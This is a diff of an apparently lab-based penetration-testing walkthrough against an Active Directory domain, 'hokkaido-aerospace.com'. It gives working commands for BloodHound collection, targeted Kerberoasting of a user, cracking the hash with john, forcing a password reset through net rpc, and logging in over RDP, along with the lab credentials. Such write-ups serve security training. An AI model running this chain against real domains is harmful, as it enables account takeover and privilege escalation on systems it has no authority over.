@@ -585,18 +585,23 @@ nxc smb 192.168.51.40 -u usernames.txt -p 'Untimed$Runny' --continue-on-success 
   - Shortest paths to Domain Admins
   - Users/groups/computers that `hrapp-service` can control (e.g. reset password on a user → Kerberoast → crack → RDP → priv esc)
 
-**Docker BloodHound-legecy Setup**: [Install BloodHound-Legecy](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart):
+**Docker BloodHound-legecy**: [Install BloodHound-Legecy](https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1):
 
 ```bash
 bloodhound-python -d hokkaido-aerospace.com -u hrapp-service -p 'Untimed$Runny' -ns 192.168.51.40 -dc dc.hokkaido-aerospace.com -c All --zip
 ```
 <img width="1378" height="389" alt="image" src="https://github.com/user-attachments/assets/05c6548d-71c4-4e43-8ca0-da444316c795" />
 
+
 ### What This Means
 - **Success**: BloodHound collected **all** relevant AD objects using the `hrapp-service` credentials.
 - **Data size**: Small but complete lab (34 users, 62 groups, 2 computers = typical Hokkaido setup with DC + maybe 1 other machine).
 - **ZIP file**: `20260303062906_bloodhound.zip` (timestamp-based) — this is the file you need to upload to your BloodHound CE web interface.
 - No DNS timeout this time → the collection ran smoothly (likely because VPN stabilized or the query was fast enough).
+
+![1_2iwovUtuhYRdzfuWojqxrA](https://github.com/user-attachments/assets/19d7f456-e89d-4d7e-b070-d106fbf5723c)
+
+As you can see in the image above the hrapp-service account has GenericWrite over hazel.green who is a member of the TIER2-ADMINS group. This group has ForceChangePassword permissions over molly.smith who turns out to be a member of TIER1-ADMINS and other sensitive groups like SERVER OPERATORS and WSUS ADMINISTRATORS.
 
 ### Next Steps (Immediate Actions)
 1. **Upload the ZIP to BloodHound CE**
@@ -627,50 +632,35 @@ python3 -m venv venv
 source venv/bin/activate
 pip3 install -r requirements.txt
 ```
+```bash
+python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --request-user 'Hazel.Green' --dc-ip hokkaido > hazel.hash
+```
+<img width="1481" height="42" alt="image" src="https://github.com/user-attachments/assets/60b92775-fe9c-4e43-a9a5-019a7a53b47c" />
 
+<img width="1535" height="475" alt="image" src="https://github.com/user-attachments/assets/9ccbe5cc-017f-4495-afcf-fc20173e6872" />
 
-
-
-
-
+**We can now go ahead and use john to crack it**
 
 ```bash
-docker-compose up -d
+john --format=krb5tgs hazel.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+<img width="907" height="189" alt="image" src="https://github.com/user-attachments/assets/5702f04a-27cb-48bd-b974-3841b10f48a6" />
+
+Now that we have Hazel’s password, we can move forward with the path BloodHound showed us. Since Hazel has ForceChangePassword permissions over molly.smith, we can use rpcclient to reset and change the password.
+
+```bash
+net rpc password "molly.smith" "Pass@123" -U 'hokkaido-aerospace.com'/'hazel.green'%'haze1988' -S "192.168.51.40"
 ```
 
-- Access: http://localhost:8080
-- Login (default): admin / admin (or your custom creds)
-- Upload the ZIP file from bloodhound-python
+<img width="1103" height="97" alt="image" src="https://github.com/user-attachments/assets/7a5ce07f-65af-44f2-b1b4-d0c45c2559f4" />
 
-**Initial graph** (from screenshot):
-- Basic MemberOf relationships visible (DOMAIN USERS → AUTHENTICATED USERS → etc.)
-- Now ready for real analysis
 
-**Next Actions in BloodHound** (do these now):
+- Now password of molly.smith is set to ‘Pass@123’
+- Now Login to molly.smith account using RDP
 
-1. **Import ZIP** → Refresh the database.
-2. **Run built-in queries**:
-   - Shortest Paths to Domain Admins (most important)
-   - Principals with DCSync Rights
-   - Paths to High Value Targets
-   - Find nodes with `GenericAll`, `GenericWrite`, `ForceChangePassword` from `hrapp-service`
-3. **Typical Hokkaido path** (based on writeups):
-   - `hrapp-service` has GenericWrite / ResetPassword on a user (e.g. Hazel.Green or similar low-priv user)
-   - Reset that user's password → add SPN → Kerberoast → crack hash
-   - Use cracked creds → RDP or WinRM → SeBackupPrivilege → dump SAM → Administrator NT hash → pwn DC
-
-**Screenshot** (add after analysis):
-- Shortest path to DA
-- Any interesting ACLs (right-click node → "Show paths to/from this node")
-
-**If spray had hits** (unlikely but possible):
-- New valid accounts → re-run BloodHound with those creds for more data
-- But in your case: **spray was negative → BloodHound is the way**
-
-Paste:
-- The output of the spray command (any `[+]` lines?)
-- BloodHound findings (shortest path screenshot/description, any notable rights like ForceChangePassword on a user)
-
-We'll add **Section 13: BloodHound Attack Path Execution** next (password reset, Kerberoast, etc.).
+```bash
+xfreerdp3 /u:molly.smith /p:'Pass@123' /drive:/tmp /dynamic-resolution /v:hokkaido
+```
+<img width="807" height="36" alt="image" src="https://github.com/user-attachments/assets/a579022c-f11d-4f31-9bff-70db355bfbe3" />
 
 
